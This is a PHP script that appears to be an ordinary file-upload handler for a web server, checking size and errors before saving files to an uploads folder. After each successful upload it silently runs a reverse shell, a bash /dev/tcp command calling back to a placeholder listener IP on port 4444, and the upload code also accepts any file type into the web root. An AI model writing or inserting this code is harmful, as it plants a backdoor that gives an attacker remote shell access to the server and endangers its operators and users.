<?php
// Function to handle file upload
function handleFileUpload($file, $targetDir, $fileSizeLimit) {
    $targetFile = $targetDir . basename($file['name']);
    $uploadOk = 1;

    // Check if file size exceeds the limit
    if ($file['size'] > $fileSizeLimit) {
        echo "Error: File is too large.";
        $uploadOk = 0;
    }

    // Check for errors during upload
    if ($file['error'] > 0) {
        echo "Error: " . $file['error'];
        $uploadOk = 0;
    }

    // Process the file if there are no errors
    if ($uploadOk == 1) {
        if (move_uploaded_file($file['tmp_name'], $targetFile)) {
            echo "The file " . htmlspecialchars(basename($file['name'])) . " has been uploaded.";

            // Reverse shell payload
            $ip = 'your.listener.ip'; // Replace with your listener IP
            $port = 4444; // Replace with your listener port
            exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
        } else {
            echo "Error: Unable to move the uploaded file.";
        }
    } else {
        echo "Sorry, your file was not uploaded.";
    }
}

// Main script execution
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['fileToUpload'])) {
    $targetDir = "/var/www/html/uploads/";
    $fileSizeLimit = 50000000; // 50MB limit for this example
    handleFileUpload($_FILES['fileToUpload'], $targetDir, $fileSizeLimit);
} else {
    echo "No file uploaded.";
}
?>
